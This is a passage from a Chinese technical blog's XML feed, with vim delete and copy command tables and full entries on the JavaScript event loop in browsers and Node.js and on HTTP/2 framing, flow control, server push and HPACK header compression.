命令不仅删除文本，它还“剪切”文本。)：</p><table><thead><tr><th>命令</th><th>删除的文本</th></tr></thead><tbody><tr><td>x</td><td>当前字符</td></tr><tr><td>3x</td><td>当前字符及其后的两个字符。</td></tr><tr><td>dd</td><td>当前行。</td></tr><tr><td>5dd</td><td>当前行及随后的四行文本。</td></tr><tr><td>dW</td><td>从光标位置开始到下一个单词的开头。</td></tr><tr><td>d$</td><td>从光标位置开始到当前行的行尾。</td></tr><tr><td>d0</td><td>从光标位置开始到当前行的行首。</td></tr><tr><td>d^</td><td>从光标位置开始到文本行的第一个非空字符。</td></tr><tr><td>dG</td><td>从当前行到文件的末尾。</td></tr><tr><td>d20G</td><td>从当前行到文件的第 20 行。</td></tr></tbody></table><p>复制命令：</p><table><thead><tr><th>命令</th><th>复制的内容</th></tr></thead><tbody><tr><td>yy</td><td>当前行。</td></tr><tr><td>5yy</td><td>当前行及随后的四行文本。</td></tr><tr><td>yW</td><td>从当前光标位置到下一个单词的开头。</td></tr><tr><td>y$</td><td>从当前光标位置到当前行的末尾。</td></tr><tr><td>y0</td><td>从当前光标位置到行首。</td></tr><tr><td>y^</td><td>从当前光标位置到文本行的第一个非空字符。</td></tr><tr><td>yG</td><td>从当前行到文件末尾。</td></tr><tr><td>y20G</td><td>从当前行到文件的第 20 行。</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Shell-环境&quot;&gt;&lt;a href=&quot;#Shell-环境&quot; class=&quot;headerlink&quot; title=&quot;Shell 环境&quot;&gt;&lt;/a&gt;Shell 环境&lt;/h2&gt;&lt;p&gt;&lt;code&gt;shell&lt;/code&gt; 在环境中存储了两种基本类型的数据，虽然 &lt;code&gt;bash&lt;/code&gt; 几乎无法分辨这些数据的类型。它们是环境变量和 &lt;code&gt;shell&lt;/code&gt; 变量。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://1016990109.github.io/tags/Linux/"/>
    
      <category term="Shell" scheme="http://1016990109.github.io/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之JS事件循环</title>
    <link href="http://1016990109.github.io/2018/08/19/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BJS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/"/>
    <id>http://1016990109.github.io/2018/08/19/前端基础之JS事件循环/</id>
    <published>2018-08-19T15:22:38.000Z</published>
    <updated>2018-09-04T07:27:31.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><code>JavaScript</code> 从诞生之日起就是一门单线程的非阻塞的脚本语言</p><p>单线程是必要的，也是 <code>JavaScript</code> 这门语言的基石，原因之一在其最初也是最主要的执行环境——浏览器中，我们需要进行各种各样的 <code>DOM</code> 操作。试想一下 如果 <code>JavaScript</code> 是多线程的，那么当两个线程同时对 <code>DOM</code> 进行一项操作，例如一个向其添加事件，而另一个删除了这个 <code>DOM</code>，此时该如何处理呢？因此，为了保证不会 发生类似于这个例子中的情景，<code>JavaScript</code> 选择只用一个主线程来执行代码，这样就保证了程序执行的一致性。</p><a id="more"></a><p>为了利用多核 <code>CPU</code> 的计算能力，<code>HTML5</code> 提出 <code>Web Worker</code> 标准，允许 <code>JavaScript</code> 脚本创建多个线程，但是子线程完全受主线程控制，且不得操作 <code>DOM</code>。所以，这个新标准并没有改变 <code>JavaScript</code> 单线程的本质。</p><h2 id="浏览器-JS-引擎事件循环"><a href="#浏览器-JS-引擎事件循环" class="headerlink" title="浏览器 JS 引擎事件循环"></a>浏览器 JS 引擎事件循环</h2><h3 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h3><p>主线程完全可以不管 <code>IO</code> 设备，挂起处于等待中的任务，先运行排在后面的任务。等到 <code>IO</code> 设备返回了结果，再回过头，把挂起的任务继续执行下去。</p><p>于是，所有任务可以分成两种，一种是同步任务（<code>synchronous</code>），另一种是异步任务（<code>asynchronous</code>）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（<code>task queue</code>）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。</p><p>运行机制如下：</p><p>（1）所有同步任务都在主线程上执行，形成一个执行栈（<code>execution context stack</code>）。<br>（2）主线程之外，还存在一个”任务队列”（<code>task queue</code>）。只要异步任务有了运行结果，就在”任务队列”之中放置一个事件。<br>（3）一旦”执行栈”<strong>所有</strong>同步任务执行完毕，系统就会读取”任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。<br>（4）主线程不断重复上面的第三步。</p><blockquote><p>“任务队列”是一个事件的队列（也可以理解成消息的队列），<code>IO</code> 设备完成一项任务，就在”任务队列”中添加一个事件，表示相关的异步任务可以进入”执行栈”了。主线程读取”任务队列”，就是读取里面有哪些事件。除了 <code>IO</code> 设备事件，用户点击事件等也是会进入”任务队列”的。”任务队列”是先进先出的，主线程的读取过程基本上是自动的，只要执行栈一清空，”任务队列”上第一位的事件就自动进入主线程。</p></blockquote><h3 id="macro-task-宏任务-与-micro-task-微任务"><a href="#macro-task-宏任务-与-micro-task-微任务" class="headerlink" title="macro task(宏任务) 与 micro task(微任务)"></a>macro task(宏任务) 与 micro task(微任务)</h3><p>异步任务之间也有执行的优先级，不同的异步任务被分为两类：微任务（<code>micro task</code>）和宏任务（<code>macro task</code>）。</p><p>以下事件属于宏任务：</p><ul><li>setInterval()</li><li>setTimeout()</li></ul><p>以下事件属于微任务：</p><ul><li>new Promise()</li><li>new MutaionObserver()</li></ul><p>在一个事件循环中，异步事件返回结果后会被放到一个任务队列中。然而，根据这个异步事件的类型，这个事件实际上会被对应的宏任务队列或者微任务队列中去。并且在当前执行栈为空的时候，主线程会查看微任务队列是否有事件存在。</p><p><strong>当当前执行栈执行完毕时会立刻先处理所有微任务队列中的事件，然后再去宏任务队列中取出一个事件。同一次事件循环中，微任务永远在宏任务之前执行。</strong></p><p><strong>同类型异步任务按进入的先后顺序依次触发。</strong></p><h2 id="Node-环境下的事件循环"><a href="#Node-环境下的事件循环" class="headerlink" title="Node 环境下的事件循环"></a>Node 环境下的事件循环</h2><p><code>Node.js</code> 也是单线程的 <code>Event Loop</code>，但是它的运行机制不同于浏览器环境。</p><p><code>Node</code> 中事件循环的实现是依靠的 <code>libuv</code> 引擎。我们知道 <code>Node</code> 选择 <code>Chrome v8</code> 引擎作为 <code>js</code> 解释器，<code>v8</code> 引擎将 <code>js</code> 代码分析后去调用对应的 <code>Node API</code>，而这些 <code>API</code> 最后则由 <code>libuv</code> 引擎驱动，执行对应的任务，并把不同的事件放在不同的队列中等待主线程执行。 因此实际上 <code>Node</code> 中的事件循环存在于 <code>libuv</code> 引擎中。</p><p>我们来看看 <code>libuv</code> 的事件循环模型：</p><p><img src="/assets/img/node_event_loop.png" alt="node event loop"></p><blockquote><p><code>timers</code>，一个 <code>timer</code> 指定一个下限时间而不是准确时间，在达到这个下限时间后执行回调。在指定的时间过后，<code>timers</code> 会尽早的执行回调，但是系统调度或者其他回调的执行可能会延迟它们。下限的时间有一个范围：[1, 2147483647]，如果设定的时间不在这个范围，将被设置为 1。</p></blockquote><blockquote><p><code>setImmediate()</code> 具有最高优先级，只要 <code>poll</code> 队列为空，代码被 <code>setImmediate()</code>，无论是否有 <code>timers</code> 达到下限时间，<code>setImmediate()</code>的代码都先执行。</p></blockquote><p>我们可以大致分析出 <code>Node</code> 中的事件循环的顺序：</p><p>外部输入数据–&gt;轮询阶段(<code>poll</code>)–&gt;检查阶段(<code>check</code>)–&gt;关闭事件回调阶段(<code>close callback</code>)–&gt;定时器检测阶段(<code>timer</code>)–&gt;<code>I/O</code> 事件回调阶段(<code>I/O callbacks</code>)–&gt;闲置阶段(<code>idle</code>, <code>prepare</code>)–&gt;轮询阶段…</p><p>除了 <code>setTimeout</code> 和 <code>setInterval</code> 这两个方法，<code>Node.js</code> 还提供了另外两个与”任务队列”有关的方法：<code>process.nextTick</code> 和 <code>setImmediate</code>。</p><p>执行顺序为 <code>process.nextTick</code>(单独的一个队列) –&gt; 微任务(<code>Promise</code>，<code>MutaionObserver</code>) –&gt; 宏任务(<code>setTimeout</code>，<code>setInterval</code>)/<code>setImmediate</code></p><blockquote><p>注意错误使用 <code>process.nextTick</code> 可能会进入一个死循环，而导致 <code>js</code> 主线程阻塞，而 <code>setTimeout(function, 0)</code> 不会。<code>process.nextTick</code> 在当前”执行栈”执行。</p></blockquote><h3 id="关于-setTimeout-和-setImmediate"><a href="#关于-setTimeout-和-setImmediate" class="headerlink" title="关于 setTimeout 和 setImmediate"></a>关于 setTimeout 和 setImmediate</h3><p><code>setTimeout</code> 和 <code>setImmediate</code> 在 <code>Node</code> 环境下执行是靠“随缘法则”的，执行先后顺序不确定。</p><p>首先进入的是 <code>timers</code> 阶段，如果我们的机器性能一般，那么进入 <code>timers</code> 阶段，一毫秒已经过去了（<code>setTimeout(fn, 0)</code>等价于 <code>setTimeout(fn, 1)</code>），那么 <code>setTimeout</code> 的回调会首先执行。</p><p>如果没有到一毫秒，那么在 <code>timers</code> 阶段的时候，下限时间没到，<code>setTimeout</code> 回调不执行，事件循环来到了 <code>poll</code> 阶段，这个时候队列为空，此时有代码被 <code>setImmediate()</code>，于是先执行了 <code>setImmediate()</code> 的回调函数，之后在下一个事件循环再执行 <code>setTimemout</code> 的回调函数。</p><p>而我们在执行代码的时候，进入 <code>timers</code> 的时间延迟其实是随机的，并不是确定的，所以会出现两个函数执行顺序随机的情况。</p><p>但是有种情况例外：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">fs.readFile(__filename, () =&gt; &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'timeout'</span>)</span><br><span class="line">  &#125;, <span class="number">0</span>)</span><br><span class="line">  setImmediate(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'immediate'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面代码，<code>setImmediate</code> 永远优先 <code>setTimeout</code> 执行。</p><p><code>fs.readFile</code> 的回调是在 <code>poll</code> 阶段执行的，当其回调执行完毕之后，<code>poll</code> 队列为空，而 <code>setTimeout</code> 入了 <code>timers</code> 的队列，此时有代码被 <code>setImmediate()</code>，于是事件循环先进入 <code>check</code> 阶段执行回调，之后在下一个事件循环再在 <code>timers</code> 阶段中执行有效回调。</p><p><strong>总结：</strong></p><ul><li>如果两者都在主模块中调用，那么执行先后取决于进程性能，也就是随机。</li><li>如果两者都不在主模块调用（被一个异步操作包裹），那么 <code>setImmediate</code> 的回调永远先执行。</li></ul><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>为了更好地理解事件循环，可以尝试运行下面的代码，看看结果如何：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">7</span>)</span><br><span class="line">&#125;)</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line">process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">6</span>)</span><br><span class="line">  process.nextTick(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">8</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> <span class="title">executor</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    i == <span class="number">9999</span> &amp;&amp; resolve()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">4</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行队列(同步) 2 3 5   6 8（6,8为nextTick队列中的)</span></span><br><span class="line"><span class="comment">//任务队列(异步) 4 (1,7顺序不确定)</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt; 从诞生之日起就是一门单线程的非阻塞的脚本语言&lt;/p&gt;
&lt;p&gt;单线程是必要的，也是 &lt;code&gt;JavaScript&lt;/code&gt; 这门语言的基石，原因之一在其最初也是最主要的执行环境——浏览器中，我们需要进行各种各样的 &lt;code&gt;DOM&lt;/code&gt; 操作。试想一下 如果 &lt;code&gt;JavaScript&lt;/code&gt; 是多线程的，那么当两个线程同时对 &lt;code&gt;DOM&lt;/code&gt; 进行一项操作，例如一个向其添加事件，而另一个删除了这个 &lt;code&gt;DOM&lt;/code&gt;，此时该如何处理呢？因此，为了保证不会 发生类似于这个例子中的情景，&lt;code&gt;JavaScript&lt;/code&gt; 选择只用一个主线程来执行代码，这样就保证了程序执行的一致性。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="eventloop" scheme="http://1016990109.github.io/tags/eventloop/"/>
    
      <category term="事件循环" scheme="http://1016990109.github.io/tags/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之HTTP/2</title>
    <link href="http://1016990109.github.io/2018/08/15/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BHTTP2/"/>
    <id>http://1016990109.github.io/2018/08/15/前端基础之HTTP2/</id>
    <published>2018-08-15T11:00:44.000Z</published>
    <updated>2018-08-16T15:37:13.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>HTTP/2</code> 可以让我们的应用更快、更简单、更稳定。</p><p><code>HTTP/2</code> 的目的是通过支持完整的请求与响应复用来减少延迟，通过有效压缩 <code>HTTP</code> 标头字段将协议开销降至最低，同时增加对请求优先级和服务器推送的支持。为达成这些目标，<code>HTTP/2</code> 还给我们带来了大量其他协议层面的辅助实现，例如新的流控制、错误处理和升级机制。</p><p>需要注意的是，<code>HTTP/2</code> 仍是对之前 <code>HTTP</code> 标准的扩展，而非替代。<code>HTTP</code> 的应用语义不变，提供的功能不变，<code>HTTP</code> 方法、状态代码、<code>URI</code> 和标头字段等这些核心概念也不变。</p><a id="more"></a><h2 id="二进制分帧层"><a href="#二进制分帧层" class="headerlink" title="二进制分帧层"></a>二进制分帧层</h2><p><code>HTTP/2</code> 所有性能增强的核心在于新的二进制分帧层，它定义了如何封装 <code>HTTP</code> 消息并在客户端与服务器之间传输。</p><p><img src="/assets/img/binary_framing_layer01.svg" alt="binary framing layer"></p><h2 id="数据流、消息和帧"><a href="#数据流、消息和帧" class="headerlink" title="数据流、消息和帧"></a>数据流、消息和帧</h2><ul><li>数据流：已建立的连接内的双向字节流，可以承载一条或多条消息。</li><li>消息：与逻辑请求或响应消息对应的完整的一系列帧。</li><li>帧：<code>HTTP/2</code> 通信的最小单位，每个帧都包含帧头，至少也会标识出当前帧所属的数据流。</li></ul><p>这些概念的关系总结如下：</p><ul><li>所有通信都在一个 <code>TCP</code> 连接上完成，此连接可以承载任意数量的双向数据流。</li><li>每个数据流都有一个唯一的标识符和可选的优先级信息，用于承载双向消息。</li><li>每条消息都是一条逻辑 <code>HTTP</code> 消息（例如请求或响应），包含一个或多个帧。</li><li>帧是最小的通信单位，承载着特定类型的数据，例如 <code>HTTP</code> 标头、消息负载，等等。来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。</li></ul><p><img src="/assets/img/streams_messages_frames01.svg" alt="streams messages frames"></p><h2 id="请求与响应复用"><a href="#请求与响应复用" class="headerlink" title="请求与响应复用"></a>请求与响应复用</h2><p>在 <code>HTTP/1.x</code> 中，如果客户端要想发起多个并行请求以提升性能，则必须使用多个 <code>TCP</code> 连接。这是 <code>HTTP/1.x</code> 交付模型的直接结果，该模型可以保证每个连接每次只交付一个响应（响应排队）。更糟糕的是，这种模型也会导致队首阻塞，从而造成底层 <code>TCP</code> 连接的效率低下。<strong>这就是需要对请求资源的个数做优化的原因(CSS Sprite、合并 js 和 css、内联小资源、利用 HTTP 管道、域名分片)</strong></p><blockquote><p><em>队首阻塞：</em> &gt; <strong>1.<code>http1.0</code> 的队首阻塞</strong><br>对于同一个 <code>tcp</code> 连接，所有的 <code>http1.0</code> 请求放入队列中，只有前一个请求的响应收到了，然后才能发送下一个请求。<br>可见，<code>http1.0</code> 的队首组塞发生在客户端。<br><strong>2.<code>http1.1</code> 的队首阻塞</strong><br>对于同一个 <code>tcp</code> 连接，<code>http1.1</code> 允许一次发送多个 <code>http1.1</code> 请求，也就是说，不必等前一个响应收到，就可以发送下一个请求，这样就解决了 <code>http1.0</code> 的客户端的队首阻塞。但是，<code>http1.1</code> 规定，服务器端的响应的发送要根据请求被接收的顺序排队，也就是说，先接收到的请求的响应也要先发送。这样造成的问题是，如果最先收到的请求的处理时间长的话，响应生成也慢，就会阻塞已经生成了的响应的发送，也会造成队首阻塞。</p></blockquote><p><code>HTTP/2</code> 中新的二进制分帧层突破了这些限制，实现了完整的请求和响应复用：客户端和服务器可以将 <code>HTTP</code> 消息分解为互不依赖的帧，然后交错发送，最后再在另一端把它们重新组装起来。就是请求或者响应可以不一起发送，而是分帧发送，哪一个消息的帧准备好了就可以发，而不用等待。</p><h2 id="数据流优先级"><a href="#数据流优先级" class="headerlink" title="数据流优先级"></a>数据流优先级</h2><p>前面提到每个数据流都有一个唯一的标识符和可选的优先级消息，这个优先级消息就包括关联的权重和依赖关系：</p><ul><li>可以向每个数据流分配一个介于 1 至 256 之间的整数。</li><li>每个数据流与其他数据流之间可以存在显式依赖关系。</li></ul><p>总体的规则就是父项优先级更高，也就是 ”根数据流“ 的子项优先级最高，当同级时按照权重分配资源。</p><blockquote><p>注意着不能保证顺序，只是要求，即客户端无法强制服务器通过数据流优先级以特定顺序处理数据流。</p></blockquote><h2 id="每个来源一个连接"><a href="#每个来源一个连接" class="headerlink" title="每个来源一个连接"></a>每个来源一个连接</h2><p>每一个 <code>origin</code> 只需要一个连接，因为每个数据流都拆分成很多帧，而这些帧可以交错，还可以分别设定优先级。因此，所有 <code>HTTP/2</code> 连接都是永久的，而且仅需要每个来源一个连接，随之带来诸多性能优势。</p><blockquote><p>连接数量减少对提升 <code>HTTPS</code> 部署的性能来说是一项特别重要的功能：可以减少开销较大的 <code>TLS</code> 连接数、提升会话重用率，以及从整体上减少所需的客户端和服务器资源。</p></blockquote><h2 id="流控制"><a href="#流控制" class="headerlink" title="流控制"></a>流控制</h2><p>流控制是一种阻止发送方向接收方发送大量数据的机制，以免超出后者的需求或处理能力。</p><p><code>HTTP/2</code> 的流量控制具有以下特征：</p><p>1.流量控制是特定于一个连接的。每种类型的流量控制都是在单独的一跳的两个端点之间的，并不是在整个端到端的路径上的。（这里的一跳指的是 <code>HTTP</code> 连接的一跳，而不是 <code>IP</code> 路由的一跳）</p><p>2.流量控制是基于 <code>WINDOW_UPDATE</code> 帧的。接收方公布自己打算在每个流以及整个连接上分别接收多少字节。这是一个以信用为基础的方案。</p><p>3.流量控制是有方向的，由接收者全面控制。接收方可以为每个流和整个连接设置任意的窗口大小。发送方必须尊重接收方设置的流量控制限制。客户方、服务端和中间代理作为接收方时都独立地公布各自的流量控制窗口，作为发送方时都遵守对端的流量控制设置。</p><p>4.无论是新流还是整个连接，流量控制窗口的初始值是 65535 字节。</p><p>5.帧的类型决定了流量控制是否适用于帧。目前，只有 <code>DATA</code> 帧服从流量控制，所有其它类型的帧并不消耗流量控制窗口的空间。这保证了重要的控制帧不会被流量控制阻塞。</p><p>6.流量控制不能被禁用。建立 <code>HTTP/2</code> 连接后，客户端将与服务器交换 <code>SETTINGS</code> 帧，这会在两个方向上设置流控制窗口。流控制窗口的默认值设为 65535(2^16 - 1) 字节，但是接收方可以设置一个较大的最大窗口大小（2^31-1 字节），并在接收到任意数据时通过发送 <code>WINDOW_UPDATE</code> 帧来维持这一大小。</p><p>7.<code>HTTP/2</code> 只定义了 <code>WINDOW_UPDATE</code> 帧的格式和语义，并没有规定接收方如何决定何时发送帧、发送什么样的值，也没有规定发送方如何选择发送包。具体实现可以选择任何满足需求的算法。</p><h2 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h2><p><code>HTTP/2</code> 新增的另一个强大的新功能是，服务器可以对一个客户端请求发送多个响应。换句话说，除了对最初请求的响应外，服务器还可以向客户端推送额外资源，而无需客户端明确地请求。</p><p><img src="/assets/img/server_push.svg" alt="server push"></p><h3 id="PUSH-PROMISE"><a href="#PUSH-PROMISE" class="headerlink" title="PUSH_PROMISE"></a>PUSH_PROMISE</h3><p>所有服务器推送数据流都由 <code>PUSH_PROMISE</code> 帧发起，表明了服务器向客户端推送所述资源的意图，并且需要 <strong>先于请求推送资源的响应数据传输</strong>。这种传输顺序非常重要：客户端需要了解服务器打算推送哪些资源，以免为这些资源创建重复请求。满足此要求的最简单策略是先于父响应（即，<code>DATA</code> 帧）发送所有 <code>PUSH_PROMISE</code> 帧，其中包含所承诺资源的 <code>HTTP</code> 标头。</p><p>在客户端接收到 <code>PUSH_PROMISE</code> 帧后，它可以根据自身情况选择拒绝数据流（通过 <code>RST_STREAM</code> 帧）。 （如果资源已经位于缓存中，可能会发生这种情况。）这是一个相对于 <code>HTTP/1.x</code> 的重要提升。 相比之下，使用资源内联（一种受欢迎的 <code>HTTP/1.x</code> “优化”）等同于“强制推送”：<strong>客户端无法选择拒绝、取消或单独处理内联的资源</strong>。</p><h2 id="标头压缩"><a href="#标头压缩" class="headerlink" title="标头压缩"></a>标头压缩</h2><p>传统的 <code>HTTP/1.x</code> 传递报文时需要传输标头，有时候会很大(带上 <code>cookie</code> 的时候)，开销过大了。而 <code>HTTP/2</code> 使用 <code>HPACK</code> 压缩格式压缩请求和响应标头元数据，这种格式通过两种方式压缩：</p><ul><li>这种格式支持通过静态 <code>Huffman</code> 代码对传输的标头字段进行编码，从而减小了各个传输的大小。</li><li>这种格式要求客户端和服务器同时维护和更新一个包含之前见过的标头字段的索引列表（换句话说，它可以建立一个共享的压缩上下文），此列表随后会用作参考，对之前传输的值进行有效编码。</li></ul><p>利用 <code>Huffman</code> 编码，可以在传输时对各个值进行压缩(比如还没建立索引时，传输的 <code>User-Agent</code> 的内容也就是值可以使用霍夫曼编码压缩)，而利用之前传输值的索引列表，我们可以通过传输索引值的方式对重复值进行编码，索引值可用于有效查询和重构完整的标头键值对(比如之前传递过 <code>MyHeader:test</code> 的头部，建立索引放在动态表中，索引为 62，那么下次传输只用传递索引值 62即可)。</p><p>作为一种进一步优化方式，<code>HPACK</code> 压缩上下文包含一个静态表和一个动态表：静态表在规范中定义，并提供了一个包含所有连接都可能使用的常用 <code>HTTP</code> 标头字段（例如，有效标头名称）的列表；动态表最初为空，将根据在特定连接内交换的值进行更新。因此，为之前未见过的值采用静态 <code>Huffman</code> 编码，并替换每一侧静态表或动态表中已存在值的索引，可以减小每个请求的大小。</p><p>下面是预定义的头字段静态映射表：</p><p><img src="/assets/img/http2_static_table.png" alt="static tabel"></p><blockquote><p>在 <code>HTTP/2</code> 中，请求和响应标头字段的定义保持不变，仅有一些微小的差异：所有标头字段名称均为小写，请求行现在拆分成各个 <code>:method</code>、<code>:scheme</code>、<code>:authority</code> 和 <code>:path</code> 伪标头字段。</p></blockquote><h3 id="HPACK-的安全性和性能"><a href="#HPACK-的安全性和性能" class="headerlink" title="HPACK 的安全性和性能"></a>HPACK 的安全性和性能</h3><blockquote><p>早期版本的 <code>HTTP/2</code> 和 <code>SPDY</code> 使用 <code>zlib</code>（带有一个自定义字典）压缩所有 <code>HTTP</code> 标头。然而，2012 年夏天，出现了针对 <code>TLS</code> 和 <code>SPDY</code> 压缩算法的“犯罪”安全攻击，此攻击会导致会话被劫持。 于是，<code>zlib</code> 压缩算法被 <code>HPACK</code> 替代，后者经过专门设计，可以解决发现的安全问题、实现起来也更高效和简单，当然，可以对 <code>HTTP</code> 标头元数据进行良好压缩。</p></blockquote><p>关于 <code>HPACK</code> 压缩算法的完成详情查看 <a href="https://tools.ietf.org/html/draft-ietf-httpbis-header-compression" target="_blank" rel="noopener">https://tools.ietf.org/html/draft-ietf-httpbis-header-compression</a>。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://developers.google.cn/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener">HTTP/2 简介</a></li><li><a href="https://www.cnblogs.com/ghj1976/p/4586529.html" target="_blank" rel="noopener">为 HTTP/2 头压缩专门设计的 HPACK</a></li><li><a href="https://www.cnblogs.com/hustdc/p/8487366.html" target="_blank" rel="noopener">http协议的队首阻塞</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;&lt;code&gt;HTTP/2&lt;/code&gt; 可以让我们的应用更快、更简单、更稳定。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HTTP/2&lt;/code&gt; 的目的是通过支持完整的请求与响应复用来减少延迟，通过有效压缩 &lt;code&gt;HTTP&lt;/code&gt; 标头字段将协议开销降至最低，同时增加对请求优先级和服务器推送的支持。为达成这些目标，&lt;code&gt;HTTP/2&lt;/code&gt; 还给我们带来了大量其他协议层面的辅助实现，例如新的流控制、错误处理和升级机制。&lt;/p&gt;
&lt;p&gt;需要注意的是，&lt;code&gt;HTTP/2&lt;/code&gt; 仍是对之前 &lt;code&gt;HTTP&lt;/code&gt; 标准的扩展，而非替代。&lt;code&gt;HTTP&lt;/code&gt; 的应用语义不变，提供的功能不变，&lt;code&gt;HTTP&lt;/code&gt; 方法、状态代码、&lt;code&gt;URI&lt;/code&gt; 和标头字段等这些核心概念也不变。&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="网络" scheme="http://1016990109.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="HTTP/2" scheme="http://1016990109.github.io/tags/HTTP-2/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之关键路径渲染优化</title>
    <link href="http://1016990109.github.io/2018/08/09/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84%E6%B8%B2%E6%9F%93%E4%BC%98%E5%8C%96/"/>
    <id>http://1016990109.github.io/2018/08/09/前端基础之关键路径渲染优化/</id>
    <published>2018-08-09T15:14:24.000Z</published>
    <updated>2018-08-15T11:00:03.092Z</updated>
    
